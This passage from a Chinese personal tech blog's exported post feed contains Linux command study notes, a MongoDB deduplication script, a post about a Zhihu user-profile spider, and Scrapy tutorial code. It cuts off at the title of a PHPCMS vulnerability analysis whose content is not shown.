<li>关机或重启推荐shutdown</li>
</ul>
</li>
</ul>
</li>
<li>系统运行级别<ul>
<li>0:关机</li>
<li>1:单用户（启动最小核心程序做系统修复，类似win中安全模式；仅root登录，故单用户</li>
<li>2:不完全多用户，不含NFS服务（不含网络服务<ul>
<li>NFS为网络文件服务，用户Linux间文件传输</li>
<li>比较方便，但存在安全隐患，不建议使用</li>
</ul>
</li>
<li>3:完全多用户（即字符界面</li>
<li>4:未分配</li>
<li>5:图形界面</li>
<li>6:重启</li>
<li>其它<ul>
<li>init命令选择具体运行级别</li>
<li>/etc/inittab文件来修改系统默认运行级别</li>
<li>runlevel：查询系统运行级别（第一个数字是前一个，第二个是当前的</li>
</ul>
</li>
</ul>
</li>
<li>退出登录命令<ul>
<li>logout</li>
</ul>
</li>
</ul>
<h2 id="用户管理命令"><a href="#用户管理命令" class="headerlink" title="用户管理命令"></a>用户管理命令</h2><ul>
<li>useradd和passwd<ul>
<li>useradd+用户名<ul>
<li>添加新用户</li>
</ul>
</li>
<li>passwd+用户名<ul>
<li>为用户设置密码</li>
<li>新用户必须设置密码后才可以登录，才可正常使用</li>
</ul>
</li>
</ul>
</li>
<li>who：查看登录用户信息</li>
<li>w：查看登录用户详细信息</li>
</ul>
<h2 id="帮助命令"><a href="#帮助命令" class="headerlink" title="帮助命令"></a>帮助命令</h2><ul>
<li>man命令：详细帮助信息<ul>
<li>简介<ul>
<li>manual，格式：man + 命令或配置文件</li>
<li>浏览过程类似more或less，回车换行、空格翻页、q退出、\搜索等</li>
</ul>
</li>
<li>可查看某命令的帮助信息<ul>
<li>一看：此命令具体功能</li>
<li>二看：此命令某个选项或参数的作用</li>
</ul>
</li>
<li>可以查看配置文件的帮助信息<ul>
<li>man + 配置文件名称，不可加绝对路径</li>
<li>一看：此配置文件作用；</li>
<li>二看：此配置文件格式</li>
</ul>
</li>
<li>man passwd相关<ul>
<li>即存在命令又存在配置文件，优先显示命令的帮助信息</li>
<li>多种帮助类型<ul>
<li>1:命令的帮助</li>
<li>5:配置文件的帮助</li>
</ul>
</li>
<li>man 5 passwd：查看配置文件的帮助</li>
</ul>
</li>
</ul>
</li>
<li>查看简要帮助信息<ul>
<li>whatis命令<ul>
<li>简单查看命令的作用</li>
</ul>
</li>
<li>apropos命令<ul>
<li>简单查看配置文件的作用</li>
<li>同样，不加绝对路径，只加配置文件名即可</li>
</ul>
</li>
</ul>
</li>
<li>只查看命令的某参数<ul>
<li>-h</li>
<li>—help</li>
<li>很多命令通用</li>
</ul>
</li>
<li>help命令：内置命令的帮助<ul>
<li>获取shell内置命令的帮助信息</li>
<li>shell内置命令，找不到绝对路径，是内置的</li>
<li>用man无法获取，用help，如help cd</li>
</ul>
</li>
<li>info命令：与man大同小异</li>
</ul>
<h2 id="压缩解压命令"><a href="#压缩解压命令" class="headerlink" title="压缩解压命令"></a>压缩解压命令</h2><ul>
<li>gzip命令<ul>
<li>压缩：gzip xxx</li>
<li>解压缩：gunzip xxx.gz（或gzip -d</li>
<li>其他<ul>
<li>后缀：.gz</li>
<li>只可压缩文件，不可压缩目录</li>
<li>压缩后不保留源文件</li>
</ul>
</li>
</ul>
</li>
<li>tar命令<ul>
<li>压缩：tar -zcvf 压缩后文件名 待压缩目录<ul>
<li>z：打包的同时压缩<ul>
<li>若不带，则为.tar后缀，gzip后为.tar.gz</li>
<li>z可以替换为j，z-gzip、j-bzip2</li>
</ul>
</li>
<li>c：创建一个压缩包，create，即打包或打包且压缩（看是否有z参数</li>
<li>v：显示详细信息</li>
<li>f：后加文件名，file</li>
</ul>
</li>
<li>解压缩：tar -zxvf xxx.tar.gz<ul>
<li>x：解压缩</li>
</ul>
</li>
<li>其他<ul>
<li>操作对象为目录</li>
<li>打包与压缩是不同的，一般为打包后再压缩</li>
<li>后缀为.tar或.tar.gz，前者仅打包，后者打包后再压缩</li>
</ul>
</li>
</ul>
</li>
<li>zip命令<ul>
<li>压缩：zip -r 压缩后文件名 待压碎文件或目录<ul>
<li>r：压缩目录</li>
<li>格式类似tar，压缩后文件名在前</li>
</ul>
</li>
<li>解压缩：unzip xxx.zip</li>
<li>其他<ul>
<li>改善gz，可保留源文件，可压缩目录</li>
<li>压缩比不如gz，不常用</li>
<li>后缀：.zip</li>
<li>Linux与windows通用</li>
</ul>
</li>
</ul>
</li>
<li>bzip2命令<ul>
<li>压缩：bzip2 -k xxx<ul>
<li>k：压缩后保留原文件</li>
<li>格式类似gz，直接加待压缩的文件</li>
<li>tar -jcvf xxx.tar.bz2 待压缩文件；j参数使用bzip2</li>
</ul>
</li>
<li>解压缩：bunzip2 -k xxx.bz2<ul>
<li>k：解压后保留原压缩包文件</li>
<li>tar -jxvf xxx.tar.bz2；与tar相结合</li>
</ul>
</li>
<li>其他<ul>
<li>可与tar相结合</li>
<li>效率较zip高，增强版</li>
<li>后缀.bz2或.tar.bz2</li>
</ul>
</li>
</ul>
</li>
<li>常见后缀<ul>
<li>.gz<ul>
<li>gzip</li>
</ul>
</li>
<li>.zip<ul>
<li>zip</li>
</ul>
</li>
<li>.tar<ul>
<li>tar</li>
</ul>
</li>
<li>.tar.gz<ul>
<li>tar</li>
</ul>
</li>
<li>.bz2<ul>
<li>bzip2</li>
</ul>
</li>
<li>.tar.bz2<ul>
<li>tar</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="文件搜索命令"><a href="#文件搜索命令" class="headerlink" title="文件搜索命令"></a>文件搜索命令</h2><ul>
<li>find命令<ul>
<li>find+搜索范围+匹配条件</li>
<li>按文件名查找：find /etc -name init<ul>
<li>精确查找init文件名的文件</li>
<li>利用<em>匹配多个字符，模糊搜索，如</em>init<em>、</em>init、init*</li>
<li>利用?匹配单个字符，如：init???（init开头，后三个字符不确定</li>
<li>-iname：不区分大小写</li>
</ul>
</li>
<li>按文件大小查找：find /etc -size +204800<ul>
<li>+n：大于、-n：小于、n：等于</li>
<li>单位为数据块：1数据块=512字节=0.5k，1k=2数据块</li>
</ul>
</li>
<li>按文件所有者查找：find /home -user root<ul>
<li>-group：根据所属组查找</li>
</ul>
</li>
<li>按时间属性查找：find /etc -cmin -5<ul>
<li>查找在5分钟内被修改过属性的文件和目录</li>
<li>-5:少于五分钟、+5超过五分钟</li>
<li>-amin：访问时间access</li>
<li>-cmin：文件属性被改的时间change</li>
<li>-mmin：文件内容被改的时间modify</li>
</ul>
</li>
<li>按文件类型查找：find /etc -type d<ul>
<li>查找此目录下所有目录类型的</li>
<li>d：目录、f：文件、l：软链接文件</li>
</ul>
</li>
<li>按i节点查找，-inum<ul>
<li>ls -i：显示文件节点数</li>
<li>可用于删除(或者其他操作)特殊文件名的文件（按文件名删除失败，按i节点数删除，find / -inum 1234 -exec rm {} \;</li>
<li>可用于查看某文件的硬链接<ul>
<li>硬链接不可跨分区</li>
<li>硬链接的文件i节点数是相同的</li>
<li>得知某文件的i节点数，在同一分区find一下，可找到具有相同i节点数的文件</li>
</ul>
</li>
</ul>
</li>
<li>匹配条件的与或关系-a、-o<ul>
<li>find /etc -name init* -a -type f（多个查询条件通过a连接</li>
<li>-a：两个条件同时满足</li>
<li>-o：两个条件满足任意一个即可</li>
</ul>
</li>
<li>对搜索结果进行操作<ul>
<li>find /home -name init -exec ls -l  {}  \ ;</li>
<li>查找出文件并显示详细信息</li>
<li>-exec可以换为-ok，ok会询问是否确认（多用于删除操作时</li>
<li>-exec/-ok  命令  {}  \;（对结果执行操作，注意空格</li>
</ul>
</li>
<li>其它<ul>
<li>搜索比较慢，locate快</li>
<li>服务器高负载时尽量不使用find，其占用系统资源高</li>
</ul>
</li>
</ul>
</li>
<li>locate命令<ul>
<li>在文件数据库中查找文件</li>
<li>locate+文件名</li>
<li>locate -i + 文件名：不区分大小写</li>
<li>数据库相关<ul>
<li>位置：/var/lib/mlocate/mlocate.db</li>
<li>updatedb命令手动实时更新数据库（系统会自动更新</li>
<li>/tmp目录：不在数据库的收录范围内</li>
</ul>
</li>
</ul>
</li>
<li>which命令<ul>
<li>which + 命令名称</li>
<li>搜索命令所在目录及别名信息</li>
</ul>
</li>
<li>whereis命令<ul>
<li>whereis+命令名称</li>
<li>搜索命令所在目录及帮助文档目录</li>
</ul>
</li>
<li>grep命令<ul>
<li>grep + 选项+待搜索的字符串+文件<ul>
<li>-i：不区分大小写</li>
<li>-v：排除指定的字符串<ul>
<li>grep -v ^# xxx.conf</li>
<li>^#：以#号开头</li>
<li>排除掉以#开头的行，即去掉注释</li>
</ul>
</li>
</ul>
</li>
<li>在文件内容中搜寻字符匹配的行并输出</li>
</ul>
</li>
</ul>
<h2 id="文件处理命令"><a href="#文件处理命令" class="headerlink" title="文件处理命令"></a>文件处理命令</h2><ul>
<li>命令格式<ul>
<li>命令  [-选项]  [参数]</li>
<li>个别命令的使用不遵循此格式</li>
<li>有多个选项时，可写在一起</li>
<li>简化选项与完整选项（-a与—all</li>
</ul>
</li>
<li>目录处理命令<ul>
<li>ls命令<ul>
<li>ls + 选项+文件或目录<ul>
<li>-a：显示所有文件，包括隐藏</li>
<li>-l：显示详细信息</li>
<li>-d：查看目录属性（查看目录本身，而不显示目录下的</li>
<li>-h：以人熟悉的单位显示文件大小，如K、M，默认是字节B</li>
<li>-i：查看文件节点数，即文件ID号，唯一</li>
</ul>
</li>
<li>输出结果<ul>
<li>文件类型：-为二进制文件即普通文件、d为目录、l为软链接文件</li>
<li>u、g、o</li>
<li>r、w、x</li>
</ul>
</li>
</ul>
</li>
<li>mkdir命令<ul>
<li>创建新目录</li>
<li>mkdir -p +目录名<ul>
<li>-p：递归创建</li>
<li>可同时创建多个目录，空格分隔</li>
</ul>
</li>
</ul>
</li>
<li>cd命令：切换目录<ul>
<li>cd + 目录<ul>
<li>.当前目录</li>
<li>..上级目录</li>
<li>～家目录</li>
<li>-上次工作目录</li>
</ul>
</li>
</ul>
</li>
<li>pwd命令：显示当前目录</li>
<li>rmdir：删除空目录</li>
<li>cp命令：复制文件或目录<ul>
<li>cp -rp +原文件或目录 +目标目录<ul>
<li>r：复制目录</li>
<li>p：保留文件属性</li>
</ul>
</li>
<li>复制同时可以更改名称</li>
</ul>
</li>
<li>mv命令：剪切文件、改名<ul>
<li>mv +原文件或目录 +目标目录</li>
</ul>
</li>
<li>rm命令：删除文件<ul>
<li>rm -rf   文件或目录<ul>
<li>r：删除目录</li>
<li>f：强制执行（避免删除前的询问</li>
</ul>
</li>
<li>rf选项可用于删除目录，rmdir只可删除空目录</li>
</ul>
</li>
</ul>
</li>
<li>文件处理命令<ul>
<li>touch命令：创建空文件<ul>
<li>文件名支持特殊符号（比win多）但不建议使用</li>
<li>不建议创建带空格的文件名（默认以空格为分隔，会创建多个文件</li>
<li>若非要创建带空格的，加引号扩起来（有空格不方便，以后操作时都需要加引号</li>
</ul>
</li>
<li>cat命令：显示文件内容<ul>
<li>cat -n 文件名<ul>
<li>-n：显示行号</li>
</ul>
</li>
<li>多用于查看小文件，内容少，否则不易观察</li>
<li>tac命令：以行为单位，反向显示文件内容</li>
</ul>
</li>
<li>more命令：分页显示文件内容<ul>
<li>空格或f：翻页</li>
<li>回车：换行</li>
<li>q或Q：退出</li>
</ul>
</li>
<li>less命令：分页显示文件内容（可向上翻页<ul>
<li>pageup：往上翻页</li>
<li>上箭头：往上换行</li>
<li>/+字符串：搜索指定字符串（n往下找，</li>
<li>其它同more</li>
</ul>
</li>
<li>head命令：显示文件前面几行内容<ul>
<li>head -n 20 test.txt<ul>
<li>-n：指定行数</li>
<li>默认前10行</li>
</ul>
</li>
</ul>
</li>
<li>tail：显示文件后面几行内容<ul>
<li>-n：指定行数</li>
<li>-f：动态显示文件末尾内容（日志文件</li>
</ul>
</li>
</ul>
</li>
<li>链接命令<ul>
<li>ln：生成链接文件<ul>
<li>ln -s 原文件 目标文件（s：创建软链接</li>
<li>软链接后缀.soft、硬链接后缀.hard</li>
</ul>
</li>
<li>软链接<ul>
<li>类似win中快捷方式</li>
<li>都是：lrwxrwxrwx</li>
<li>文件小，仅是一个符号链接</li>
<li>ls -l查看时，箭头指向源文件</li>
<li>源文件删除后，软链接失效</li>
</ul>
</li>
<li>硬链接<ul>
<li>除文件名及其目录，其它都一样</li>
<li>效果等同与：cp -p  +  同步更新</li>
<li>源文件删除后，硬链接依然可使用（因其效果同拷贝</li>
<li>硬链接文件同其源文件的i节点号一致，ls -i（故可以同步更新</li>
<li>不能跨分区（软链接可以</li>
<li>不可针对目录使用（软可以</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="权限管理命令"><a href="#权限管理命令" class="headerlink" title="权限管理命令"></a>权限管理命令</h2><ul>
<li>chmod：更改文件或目录权限<ul>
<li>只有root和文件所有者可更改</li>
<li>chmod u+r 文件或目录<ul>
<li>u、g、o、a</li>
<li>+、-、=（如：g=rwx</li>
<li>r、w、x</li>
<li>可同时加多个，如u+r,g+w（逗号分隔</li>
</ul>
</li>
<li>chmod 421 文件或目录<ul>
<li>rwx分别对应421</li>
<li>-R：递归修改</li>
</ul>
</li>
<li>rwx权限<ul>
<li>文件<ul>
<li>r：可查看文件内容</li>
<li>w：可修改文件内容</li>
<li>x：可执行文件</li>
</ul>
</li>
<li>目录<ul>
<li>r：可以列出目录中内容</li>
<li>w：可在目录中创建、删除目录</li>
<li>x：可以进入目录</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>chown：更改文件或目录的所有者<ul>
<li>chown +用户+文件或目录</li>
<li>root可更改，文件所有者不可更改</li>
</ul>
</li>
<li>chgrp：更改文件或目录的所属组<ul>
<li>chgrp +组名+文件或目录</li>
<li>root可更改，文件所有者不可更改</li>
</ul>
</li>
<li>umask：显示、设置文件的缺省权限<ul>
<li>umask或umask -S<ul>
<li>S：以rwx形式显示</li>
<li>不加S：显示掩码，如0022</li>
</ul>
</li>
<li>默认权限<ul>
<li>文件：rw-r–r–（新建文件默认无执行权限</li>
<li>目录：rwxr-xr-x</li>
</ul>
</li>
<li>输出结果（不加S时<ul>
<li>0022</li>
<li>0: 表示特殊权限</li>
<li>022: 掩码，777-022=755，即rwxr-xr-x</li>
</ul>
</li>
<li>可设置默认权限<ul>
<li>如umask 023（只有后三位</li>
<li>不建议更改</li>
</ul>
</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>其它</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>mongodb去重-py实现</title>
    <url>/2017/08/25/etc/mongodb%E5%8E%BB%E9%87%8D-py%E5%AE%9E%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="mongodb数据去重，python实现"><a href="#mongodb数据去重，python实现" class="headerlink" title="mongodb数据去重，python实现"></a>mongodb数据去重，python实现</h1><h2 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h2><a id="more"></a>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="comment"># desc: mongodb的数据去重</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pymongo</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="comment"># 待去重</span></span><br><span class="line">coll_name = raw_input(<span class="string">'待清理Collection：'</span>)</span><br><span class="line">colu_name = raw_input(<span class="string">'所依据Column：'</span>)</span><br><span class="line"><span class="comment">#coll_name = 'Zhihu_user'</span></span><br><span class="line"><span class="comment">#colu_name = 'name'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 选择数据库等</span></span><br><span class="line">conn = pymongo.MongoClient(<span class="string">'localhost'</span>, <span class="number">27017</span>)      <span class="comment">#host及端口</span></span><br><span class="line">db = conn.get_database(<span class="string">"spider"</span>)        <span class="comment">#选择数据库</span></span><br><span class="line"></span><br><span class="line">coll = db.get_collection(coll_name)     <span class="comment">#选择collection</span></span><br><span class="line">cons = coll.distinct(colu_name)         <span class="comment">#选择字段</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'原记录数：%d'</span> % coll.count()</span><br><span class="line"></span><br><span class="line"><span class="comment">#数据去重</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cons:</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    num = coll.count(&#123;colu_name:i&#125;)         <span class="comment">#原记录数</span></span><br><span class="line">    <span class="keyword">while</span> num &gt; <span class="number">1</span>:</span><br><span class="line">        coll.remove(&#123;colu_name:i&#125;, <span class="number">0</span>)        <span class="comment">#1-全部删除，0-只删除一个</span></span><br><span class="line">        num -= <span class="number">1</span></span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'The program is running. Please wait'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'~'</span> * <span class="number">60</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'去重后记录数：%d'</span> % coll.count()</span><br></pre></td></tr></table></figure>
<h2 id="效果图："><a href="#效果图：" class="headerlink" title="效果图："></a>效果图：</h2><p><img src="http://ou8vctgrk.bkt.clouddn.com/17-8-25/12127510.jpg" alt></p>
<p><img src="http://ou8vctgrk.bkt.clouddn.com/17-8-25/20751566.jpg" alt></p>
]]></content>
      <categories>
        <category>其它</category>
      </categories>
      <tags>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title>ZhiHu-Users-Spider</title>
    <url>/2017/08/25/etc/ZhiHu-Users-Spider/</url>
    <content><![CDATA[<h1 id="0x00-PS："><a href="#0x00-PS：" class="headerlink" title="0x00 PS："></a>0x00 PS：</h1><p>1，应用scrapy框架爬取知乎用户；</p>
<p>2，某些知乎用户的简介还是比较有趣的。</p>
<p>3，初步代码，仅实现功能，并未进一步完善。</p>
<h1 id="0x01-github地址："><a href="#0x01-github地址：" class="headerlink" title="0x01 github地址："></a>0x01 github地址：</h1><p><a href="https://github.com/21Gun5/Zhihu_user" target="_blank" rel="noopener">https://github.com/21Gun5/Zhihu_user</a></p>
<a id="more"></a>
<h1 id="0x02-效果图："><a href="#0x02-效果图：" class="headerlink" title="0x02 效果图："></a>0x02 效果图：</h1><p>##运行时：</p>
<p><img src="http://ou8vctgrk.bkt.clouddn.com/17-8-25/35086140.jpg" alt></p>
<h2 id="结果图："><a href="#结果图：" class="headerlink" title="结果图："></a>结果图：</h2><p>全部信息字段：</p>
<p><img src="http://ou8vctgrk.bkt.clouddn.com/17-8-25/61330767.jpg" alt></p>
<p>简介字段：</p>
<p><img src="http://ou8vctgrk.bkt.clouddn.com/17-8-25/22774155.jpg" alt></p>
<p># </p>
<h1 id="0x03-相关链接："><a href="#0x03-相关链接：" class="headerlink" title="0x03 相关链接："></a>0x03 相关链接：</h1><p>1，爬取免费代理西刺代理，</p>
<p><a href="http://www.xicidaili.com，爬虫于https://github.com/21Gun5/xici_agent；" target="_blank" rel="noopener">http://www.xicidaili.com，爬虫于https://github.com/21Gun5/xici_agent；</a></p>
<p>2，爬虫反Ban，</p>
<p><a href="http://blkstone.github.io/2016/03/02/crawler-anti-anti-cheat/" target="_blank" rel="noopener">http://blkstone.github.io/2016/03/02/crawler-anti-anti-cheat/</a></p>
<p><a href="http://www.cnblogs.com/rwxwsblog/p/4582127.html（第三方工具，付费）" target="_blank" rel="noopener">http://www.cnblogs.com/rwxwsblog/p/4582127.html（第三方工具，付费）</a></p>
<p>3，mongodb查询，</p>
<p><a href="http://www.cnblogs.com/egger/archive/2013/06/14/3135847.html" target="_blank" rel="noopener">http://www.cnblogs.com/egger/archive/2013/06/14/3135847.html</a></p>
<p>4，思路参考，</p>
<p><a href="https://github.com/Germey/Zhihu，" target="_blank" rel="noopener">https://github.com/Germey/Zhihu，</a></p>
<p><a href="http://www.cnblogs.com/zhaof/p/7215617.html，" target="_blank" rel="noopener">http://www.cnblogs.com/zhaof/p/7215617.html，</a></p>
<p>适当简化，仅通过用户flowees页面获取信息。</p>
<h1 id="0x04-附mongodb去重脚本"><a href="#0x04-附mongodb去重脚本" class="headerlink" title="0x04 附mongodb去重脚本"></a>0x04 附mongodb去重脚本</h1><p><a href="/2017/08/25/mongodb去重-py实现/">mongodb去重</a></p>
]]></content>
      <categories>
        <category>其它</category>
      </categories>
      <tags>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title>scrapy框架之tutorial示例</title>
    <url>/2017/08/12/etc/scrapy%E6%A1%86%E6%9E%B6%E4%B9%8Btutorial%E7%A4%BA%E4%BE%8B/</url>
    <content><![CDATA[<h1 id="PS："><a href="#PS：" class="headerlink" title="PS："></a>PS：</h1><p>1，以scrapy中官方教程中示例学习此框架。</p>
<p>2，顺便记录，日后翻看。</p>
<h1 id="主要代码："><a href="#主要代码：" class="headerlink" title="主要代码："></a>主要代码：</h1><a id="more"></a>
<h2 id="settings-py"><a href="#settings-py" class="headerlink" title="settings.py"></a>settings.py</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 工程名字</span></span><br><span class="line">BOT_NAME = <span class="string">'tutorial'</span></span><br><span class="line"></span><br><span class="line">SPIDER_MODULES = [<span class="string">'tutorial.spiders'</span>]</span><br><span class="line">NEWSPIDER_MODULE = <span class="string">'tutorial.spiders'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Crawl responsibly by identifying yourself (and your website) on the user-agent</span></span><br><span class="line"><span class="comment">#USER_AGENT = 'tutorial (+http://www.yourdomain.com)'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 是否遵循网站的robots.txt</span></span><br><span class="line"><span class="comment"># Obey robots.txt rules</span></span><br><span class="line">ROBOTSTXT_OBEY = <span class="keyword">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 开启项目的管道处理</span></span><br><span class="line"><span class="comment"># Configure item pipelines</span></span><br><span class="line"><span class="comment"># See http://scrapy.readthedocs.org/en/latest/topics/item-pipeline.html</span></span><br><span class="line">ITEM_PIPELINES = &#123;</span><br><span class="line">   <span class="string">'tutorial.pipelines.TutorialPipeline'</span>: <span class="number">300</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># info about mongodb</span></span><br><span class="line"><span class="comment">#连接mongodb数据库相关信息。</span></span><br><span class="line">MONGODB_HOST = <span class="string">'10.10.10.1'</span></span><br><span class="line">MONGODB_PORT = <span class="number">27017</span></span><br><span class="line">MONGODB_DBNAME = <span class="string">'spider'</span></span><br><span class="line">MONGODB_TABLE = <span class="string">'quotes'</span></span><br></pre></td></tr></table></figure>
<h2 id="items-py"><a href="#items-py" class="headerlink" title="items.py"></a>items.py</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Define here the models for your scraped items</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># See documentation in:</span></span><br><span class="line"><span class="comment"># http://doc.scrapy.org/en/latest/topics/items.html</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TutorialItem</span><span class="params">(scrapy.Item)</span>:</span></span><br><span class="line">    <span class="comment"># define the fields for your item here like:</span></span><br><span class="line">    <span class="comment"># name = scrapy.Field()</span></span><br><span class="line">    <span class="comment"># 定义项目字段</span></span><br><span class="line">    content =scrapy.Field()		<span class="comment">#内容</span></span><br><span class="line">    author =scrapy.Field()		<span class="comment">#作者</span></span><br><span class="line">    tag_list =scrapy.Field()	<span class="comment">#标签</span></span><br><span class="line">    <span class="comment"># psss</span></span><br></pre></td></tr></table></figure>
<h2 id="pipelines-py"><a href="#pipelines-py" class="headerlink" title="pipelines.py"></a>pipelines.py</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Define your item pipelines here</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Don't forget to add your pipeline to the ITEM_PIPELINES setting</span></span><br><span class="line"><span class="comment"># See: http://doc.scrapy.org/en/latest/topics/item-pipeline.html</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pymongo</span><br><span class="line"><span class="keyword">import</span> settings</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TutorialPipeline</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="comment"># 连接mongodb数据库</span></span><br><span class="line">        host = settings.MONGODB_HOST		<span class="comment">#主机地址</span></span><br><span class="line">        port = settings.MONGODB_PORT		<span class="comment">#端口</span></span><br><span class="line">        dbname = settings.MONGODB_DBNAME	<span class="comment">#数据库名字</span></span><br><span class="line">        table = settings.MONGODB_TABLE		<span class="comment">#数据表名字</span></span><br><span class="line">        client = pymongo.MongoClient(host = host, port = port)		<span class="comment">#连接</span></span><br><span class="line">        db = client[dbname]		<span class="comment">#选择数据库</span></span><br><span class="line">        self.table = db[table]		<span class="comment">#选择数据表</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process_item</span><span class="params">(self, item, spider)</span>:</span></span><br><span class="line">        quote_info = dict(item)		<span class="comment">#转为字典类型</span></span><br><span class="line">        self.table.insert(quote_info)		<span class="comment">#插入数据</span></span><br><span class="line">        <span class="keyword">return</span> item</span><br></pre></td></tr></table></figure>
<h2 id="quotes-spider-py"><a href="#quotes-spider-py" class="headerlink" title="quotes_spider.py"></a>quotes_spider.py</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> scrapy</span><br><span class="line"><span class="keyword">from</span> tutorial.items <span class="keyword">import</span> TutorialItem</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">QuotesSpider</span><span class="params">(scrapy.Spider)</span>:</span></span><br><span class="line">    name = <span class="string">"quotes"</span>		<span class="comment">#爬虫id，唯一</span></span><br><span class="line">    start_urls = [<span class="string">'http://quotes.toscrape.com/'</span>]		<span class="comment">#待爬取链接</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span><span class="params">(self, response)</span>:</span></span><br><span class="line">        quote_sel_list = response.xpath(<span class="string">'//div[@class=\'quote\']'</span>)      <span class="comment">#没有加extract函数处理，便还是selecor对象</span></span><br><span class="line">        <span class="keyword">for</span> quote_sel <span class="keyword">in</span> quote_sel_list:</span><br><span class="line">            item = TutorialItem()</span><br><span class="line">            item[<span class="string">'content'</span>] = quote_sel.xpath(<span class="string">'./span[@class=\'text\']/text()'</span>).extract_first()        <span class="comment">#extract_first()取出第一个，化列表为元素</span></span><br><span class="line">            item[<span class="string">'author'</span>] = quote_sel.xpath(<span class="string">'.//small[@class=\'author\']/text()'</span>).extract_first()       <span class="comment">#//表示选取所有子元素，不考虑位置</span></span><br><span class="line">            item[<span class="string">'tag_list'</span>] = quote_sel.xpath(<span class="string">'.//a[@class=\'tag\']/text()'</span>).extract()       <span class="comment">#一个quote有多个tag，列表保存</span></span><br><span class="line">            <span class="keyword">yield</span> item</span><br><span class="line">        <span class="string">'''</span></span><br><span class="line"><span class="string">        next_url = response.xpath('//li[@class="next"]/a/@href').extract_first()        #@href得到a标签href属性值</span></span><br><span class="line"><span class="string">        if next_url is not None:</span></span><br><span class="line"><span class="string">            next_url_full = response.urljoin(next_url)      #利用urljoin方法将相对路径转为绝对路径，原来：/page/2/，之后：http://quotes.toscrape.com/page/2/</span></span><br><span class="line"><span class="string">            yield scrapy.Request(next_url_full, callback=self.parse)        #请求此url，回调函数为本身，即将此响应交由自身处理，达到递归效果；</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">        next_url_sel = response.xpath(<span class="string">'//li[@class=\'next\']/a'</span>)      <span class="comment">#传入的值为单个值，而非列表</span></span><br><span class="line">        <span class="keyword">if</span> len(next_url_sel) != <span class="number">0</span>:          <span class="comment">#列表的元素个数为0时，表示为最后一页，没有下一页链接;</span></span><br><span class="line">            <span class="keyword">yield</span> response.follow(next_url_sel[<span class="number">0</span>], callback=self.parse)        <span class="comment">#参数可以仕selector类型，且url可以是相对路径；</span></span><br></pre></td></tr></table></figure>
<h1 id="效果："><a href="#效果：" class="headerlink" title="效果："></a>效果：</h1><p>mongodb中爬取结果如下：</p>
<p><img src="http://ou8vctgrk.bkt.clouddn.com/17-8-6/21371400.jpg" alt></p>
<h1 id="github地址："><a href="#github地址：" class="headerlink" title="github地址："></a>github地址：</h1><p><a href="https://github.com/21Gun5/scrapy_tutorial" target="_blank" rel="noopener">https://github.com/21Gun5/scrapy_tutorial</a></p>
<h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><p>1，<a href="https://doc.scrapy.org/en/latest/intro/tutorial.html" target="_blank" rel="noopener">https://doc.scrapy.org/en/latest/intro/tutorial.html</a></p>
<p>2，<a href="https://scrapy-chs.readthedocs.io/zh_CN/1.0/intro/tutorial.html" target="_blank" rel="noopener">https://scrapy-chs.readthedocs.io/zh_CN/1.0/intro/tutorial.html</a></p>
<p>3，零碎知识点自行百度</p>
]]></content>
      <categories>
        <category>其它</category>
      </categories>
      <tags>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title>PHPCMS v9.6.0 任意文件上传漏洞分析</title>
